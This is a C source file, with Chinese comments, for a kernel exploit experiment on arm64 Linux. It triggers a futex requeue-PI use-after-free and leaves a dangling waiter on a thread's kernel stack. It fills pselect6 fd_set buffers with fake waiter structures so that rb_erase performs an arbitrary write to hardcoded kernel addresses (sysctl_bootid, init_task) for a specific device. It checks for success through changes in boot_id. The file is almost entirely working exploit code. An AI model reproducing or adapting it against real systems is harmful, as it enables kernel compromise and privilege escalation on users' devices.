/* PD2238 sweep 实验: 扫描 fdset 内 fake-waiter 表起始偏移 s,
 * 使 rb_erase 的任意写命中 &sysctl_bootid (boot_id 字符串变化 = 命中).
 * 基于 aristotle e2e (GPL), 目标偏移改为 PD2238 实测值. */
static long sys(long n,long a,long b,long c,long d,long e,long f){
  register long x8 __asm__("x8")=n; register long x0 __asm__("x0")=a;
  register long x1 __asm__("x1")=b; register long x2 __asm__("x2")=c;
  register long x3 __asm__("x3")=d; register long x4 __asm__("x4")=e;
  register long x5 __asm__("x5")=f;
  __asm__ volatile("svc #0":"+r"(x0):"r"(x8),"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5):"memory");
  return x0;
}
#define SYS_openat 56
#define SYS_close 57
#define SYS_read 63
#define SYS_write 64
#define SYS_pselect6 72
#define SYS_fcntl 25
#define SYS_dup3 24
#define SYS_timerfd_create 85
#define SYS_mkdirat 34
#define SYS_mount 40
#define SYS_futex 98
#define SYS_nanosleep 101
#define SYS_clock_gettime 113
#define SYS_gettid 178
#define SYS_sched_setattr 274
#define FUTEX_LOCK_PI 6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define CLOCK_MONOTONIC 1
#define AT_FDCWD -100
#define SCHED_OTHER 0
#define SCHED_BATCH 3
#define CLONE_FLAGS 0x50f00

#define KBASE            0xffffffc008000000UL
#define SYSCTL_BOOTID    (KBASE + 0x02ee910dUL)
#define INIT_TASK        (KBASE + 0x02aec240UL)
#define SCRATCH          (KBASE + 0x02e90000UL)

#define NFDS             512          /* 8 words/set -> 24 word 可控窗口 */
#define WPS              (NFDS/64)    /* words per set = 8 */

static volatile long g_log = 1;
static void puts_(const char*s){long n=0;while(s[n])n++;sys(SYS_write,g_log,(long)s,n,0,0,0);}
static void putx_(unsigned long v){
  char b[18]; b[0]='0'; b[1]='x';
  for(int i=0;i<16;i++){ int nib=(v>>((15-i)*4))&0xf; b[2+i]= nib<10?('0'+nib):('a'+nib-10); }
  sys(SYS_write,g_log,(long)b,18,0,0,0);
}
static void nsleep_us(long us){long ts[2]={us/1000000,(us%1000000)*1000};sys(SYS_nanosleep,(long)ts,0,0,0,0,0);}
static void show_bootid(const char*tag){
  char buf[64]; for(int i=0;i<64;i++) buf[i]=0;
  long fd=sys(SYS_openat,AT_FDCWD,(long)"/proc/sys/kernel/random/boot_id",0,0,0,0);
  puts_(tag);
  if(fd<0){ puts_("<err>"); return; }
  long n=sys(SYS_read,fd,(long)buf,60,0,0,0);
  sys(SYS_close,fd,0,0,0,0,0);
  if(n>0) sys(SYS_write,g_log,(long)buf,n,0,0,0);
  puts_("\n");
}
__attribute__((naked)) static long thr_clone(long flags,void*stack,int(*fn)(void*),void*arg){
  __asm__ volatile(
    "mov x9, x2\n" "mov x10, x3\n"
    "mov x2, #0\n" "mov x3, #0\n" "mov x4, #0\n"
    "mov x8, #220\n" "svc #0\n"
    "cbnz x0, 1f\n"
    "mov x0, x10\n" "blr x9\n"
    "mov x8, #93\n" "svc #0\n"
    "1:\n" "ret\n");
}

volatile unsigned int f_wait, f_pi_target, f_pi_chain;
volatile int waiter_ready, owner_started, waiter_waiting, armed, round_go, done_;
volatile long waiter_tid;

static char wstack[65536] __attribute__((aligned(16)));
static char ostack[65536] __attribute__((aligned(16)));
static char cstack[65536] __attribute__((aligned(16)));
static unsigned long inb[WPS], outb[WPS], exb[WPS];

/* flat 视图: word i => (i<WPS)?in[i]: (i<2WPS)?out[i-WPS]: ex[i-2WPS]
 * fake waiter (5.10 flat, 10 qwords) 起始放 flat[s]:
 *   +0 pc=parent   +2 left=&bootid(rb_erase 写入目标)
 *   +5 pi.pc=parent +7 pi.left=&bootid
 *   +10 task=INIT_TASK  +11 lock=SCRATCH  +12 prio=3 */
#ifdef MARKER_MODE
static void build_overlay(int s){
  /* 标记模式: word i 的值编码其字节偏移 8*i, crash 寄存器直接反推布局 */
  for(int k=0;k<WPS;k++){ inb[k]=0; outb[k]=0; exb[k]=0; }
  for(int i=0;i<3*WPS;i++){
    unsigned long v = 0xC0DE000000000000UL + (unsigned long)(i*8);
    if(i < WPS) inb[i]=v;
    else if(i < 2*WPS) outb[i-WPS]=v;
    else exb[i-2*WPS]=v;
  }
}
#else
static void build_overlay(int s){
  unsigned long parent = SCRATCH + 0x108;
  unsigned long lock   = SCRATCH;
  for(int k=0;k<WPS;k++){ inb[k]=0; outb[k]=0; exb[k]=0; }
  for(int f=0;f<13;f++){
    int i = s + f;
    if(i >= 3*WPS) continue;
    unsigned long v = 0;
    if(f==0)      v = parent;
    else if(f==2) v = SYSCTL_BOOTID;
    else if(f==3) v = parent;
    else if(f==5) v = SYSCTL_BOOTID;
    else if(f==6) v = INIT_TASK;
    else if(f==7) v = lock;
    else if(f==8) v = 3;
    else v = 0;
    if(i < WPS) inb[i]=v;
    else if(i < 2*WPS) outb[i-WPS]=v;
    else exb[i-2*WPS]=v;
  }
}
#endif
static void open_selected(void){
  long tfd = sys(SYS_timerfd_create,CLOCK_MONOTONIC,0,0,0,0,0);
  long hi  = sys(SYS_fcntl,tfd,0,NFDS+64,0,0,0);
  sys(SYS_close,tfd,0,0,0,0,0);
  int n=0;
  for(int fd=0;fd<NFDS;fd++){
    int w=fd/64, b=fd%64;
    if(((inb[w]>>b)&1) || ((outb[w]>>b)&1) || ((exb[w]>>b)&1)){
      sys(SYS_dup3,hi,fd,0,0,0,0); n++;
    }
  }
  puts_("OPEN n="); putx_((unsigned long)n); puts_(" hi="); putx_((unsigned long)hi); puts_("\n");
}
static int waiter_fn(void*a){
  (void)a;
  waiter_tid = sys(SYS_gettid,0,0,0,0,0,0);
  puts_("WTID="); putx_((unsigned long)waiter_tid); puts_("\n");
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  waiter_ready=1;
  while(!owner_started) nsleep_us(1000);
  long to[2]; sys(SYS_clock_gettime,CLOCK_MONOTONIC,(long)to,0,0,0,0);
  to[0]+=3;
  waiter_waiting=1;
  sys(SYS_futex,(long)&f_wait,FUTEX_WAIT_REQUEUE_PI,0,(long)to,(long)&f_pi_target,0);
  puts_("WAITER_RET\n");
  sys(SYS_fcntl,1,0,NFDS+128,0,0,0);
  armed=1;   /* 唤醒 consumer 开始打点 */
  /* 关键: 本线程此后绝不退出, 保住含悬垂指针的内核栈 */
  {
    build_overlay(0);
    open_selected();
    long pts[2]={5,0};
    sys(SYS_pselect6,NFDS,(long)inb,(long)outb,(long)exb,(long)pts,0);
  }
  puts_("SWEEP_LOOPS_DONE\n");
  for(;;) nsleep_us(500000);
}
static int owner_fn(void*a){
  (void)a;
  sys(SYS_futex,(long)&f_pi_target,FUTEX_LOCK_PI,0,0,0,0);
  while(!waiter_ready) nsleep_us(1000);
  owner_started=1;
  sys(SYS_futex,(long)&f_pi_chain,FUTEX_LOCK_PI,0,0,0,0);
  for(;;) nsleep_us(500000);
}
struct sched_attr{unsigned int size;unsigned int policy;unsigned long long flags;
  int nice;unsigned int priority;unsigned long long runtime,deadline,period;};
static int consumer_fn(void*a){
  (void)a;
  while(!armed) nsleep_us(1000);
  puts_("CONSUMER_GRACE_10S\n");
  long ts[2]={10,0}; sys(SYS_nanosleep,(long)ts,0,0,0,0,0);
  long i=0;
  for(;;){
    struct sched_attr at; char*p=(char*)&at; for(unsigned k=0;k<sizeof(at);k++)p[k]=0;
    at.size=sizeof(at);
    at.policy=(i&1)?SCHED_BATCH:SCHED_OTHER;
    at.nice=(int)(i%19)+1;
    sys(SYS_sched_setattr,waiter_tid,(long)&at,0,0,0,0);
    i++;
    nsleep_us(8000);
  }
}
void _start(void){
  puts_("\n=== SWEEP-PD2238 ===\n");
  sys(SYS_mkdirat,AT_FDCWD,(long)"/proc",0755,0,0,0);
  sys(SYS_mount,(long)"proc",(long)"/proc",(long)"proc",0,0,0);
  show_bootid("BOOTID_BEFORE=");
  thr_clone(CLONE_FLAGS,wstack+sizeof(wstack),waiter_fn,0);
  thr_clone(CLONE_FLAGS,ostack+sizeof(ostack),owner_fn,0);
  thr_clone(CLONE_FLAGS,cstack+sizeof(cstack),consumer_fn,0);
  while(!waiter_waiting || !owner_started) nsleep_us(1000);
  nsleep_us(100000);
  sys(SYS_futex,(long)&f_wait,FUTEX_CMP_REQUEUE_PI,1,1,(long)&f_pi_target,0);
  puts_("REQUEUE_DONE\n");
  while(!done_) nsleep_us(100000);
  puts_("=== SWEEP DONE ===\n");
  for(;;) nsleep_us(500000);
}
